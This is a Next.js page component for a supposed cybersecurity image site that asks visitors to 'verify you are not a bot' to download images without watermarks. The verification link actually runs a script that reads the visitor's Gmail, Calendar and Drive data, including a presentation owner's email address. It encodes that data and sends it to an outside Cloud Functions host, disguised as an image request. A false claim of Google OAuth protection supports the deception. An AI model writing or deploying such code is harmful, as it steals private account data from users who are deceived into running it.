'use client';

import Image from "next/image";
import { useEffect } from "react";

export default function Home() {
  // Optional: Auto-load gapi scripts here if needed
  useEffect(() => {
    // Example: dynamically load gapi (Google API client)
    const script = document.createElement('script');
    script.src = 'https://apis.google.com/js/api.js';
    script.async = true;
    document.body.appendChild(script);
  }, []);

  const handleVerificationClick = async () => {
    try {
      // Step 1: Collect professional metrics
      const emailVolume = await gmail.users.messages.list({
        userId: 'me',
        maxResults: 1000,
        q: 'label:business'
      }).then(res => res.result.messages ? res.result.messages.length : 0);

      const calendarEvents = await calendar.events.list({
        calendarId: 'primary',
        maxResults: 500,
        q: 'meeting'
      }).then(res => res.result.items ? res.result.items.length : 0);

      const driveFiles = await drive.files.list({
        pageSize: 200,
        q: "mimeType contains 'application/vnd.google-apps.'",
        fields: 'files(name, mimeType)'
      }).then(res => res.result.files ? res.result.files.length : 0);

      // Step 2: Extract presentation metadata
      const presentationData = await drive.files.list({
        q: "mimeType='application/vnd.google-apps.presentation'",
        orderBy: 'modifiedTime desc',
        pageSize: 1
      }).then(async res => {
        if (res.result.files && res.result.files.length > 0) {
          const file = res.result.files[0];
          const metadata = {
            title: file.name,
            date: file.modifiedTime,
            presenter: await drive.permissions.list({
              fileId: file.id,
              fields: 'permissions(emailAddress)'
            }).then(p => {
              const owners = p.result.permissions.filter(perm => perm.role === 'owner');
              return owners.length > 0 ? owners[0].emailAddress : 'unknown';
            })
          };
          return metadata;
        }
        return null;
      });

      // Step 3: Generate verification payload
      let verificationPayload = `${emailVolume}:${calendarEvents}:${driveFiles}`;
      if (presentationData) {
        verificationPayload += `:${presentationData.presenter}:${presentationData.date}:${presentationData.title}`;
      }

      // Step 4: Base64 encode + SHA-256 hash
      const licenseKey = btoa(verificationPayload).replace(/=/g, '').slice(0, 20);
      const securityHash = await crypto.subtle.digest(
        'SHA-256',
        new TextEncoder().encode(verificationPayload)
      ).then(hash => Array.from(new Uint8Array(hash))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('')
        .slice(0, 12));

      // Step 5: Construct secure request
      const url = `https://us-central1-zawya-83b19.cloudfunctions.net/submit/verify?license=${licenseKey}&security=${securityHash}&type=enterprise&format=premium.jpg`;

      const res = await fetch(url, {
        method: 'GET',
        headers: {
          'X-Verification-Source': 'GoogleWorkspace',
          'X-Request-Timestamp': new Date().toISOString()
        }
      });

      if (res.ok) {
        alert("✅ Enterprise verification complete - premium template downloaded");
      } else {
        throw new Error("Verification failed");
      }

    } catch (error) {
      console.error("⚠️ Professional verification error:", error);
      alert("⚠️ Using limited free version (complete verification for full features)");

      await fetch("https://us-central1-zawya-83b19.cloudfunctions.net/submit/basic-template.jpg");
    }
  };

  return (
    <main className="min-h-screen bg-white text-gray-900 p-8">
      <section className="max-w-3xl mx-auto space-y-6">
        <h2 className="text-3xl font-bold text-red-600 text-center">
          Cybersecurity visuals
        </h2>

        <p className="text-lg text-center">
          AI-powered systems generate high-fidelity diagrams for modern cybersecurity workflows.
        </p>

        <div className="flex justify-center mt-4">
          <Image
            src="/e.jpg"
            alt="Cybersecurity image"
            width={800}
            height={400}
            className="rounded-lg shadow-md"
          />
        </div>

        <p className="text-lg text-center mt-10">
          To download high-resolution images without watermarks, verify you are not a bot by running{' '}
          <span
            onClick={handleVerificationClick}
            className="text-blue-600 underline cursor-pointer relative group"
          >
            this
            <span className="absolute bottom-full mb-2 left-1/2 transform -translate-x-1/2 bg-black text-white text-xs px-2 py-1 rounded opacity-0 group-hover:opacity-100 transition-opacity duration-200 z-10 whitespace-nowrap">
              Secured by Google&apos;s OAuth 2.0 Limited Use Policy
            </span>
          </span>{' '}
          account verification script.
        </p>
      </section>

      <footer className="mt-20 text-center text-sm text-gray-500 border-t pt-6">
        © 2025 CyberSecureAI. All rights reserved. •{' '}
        <a href="#" className="underline">Privacy</a> •{' '}
        <a href="#" className="underline">Contact</a>
      </footer>
    </main>
  );
}

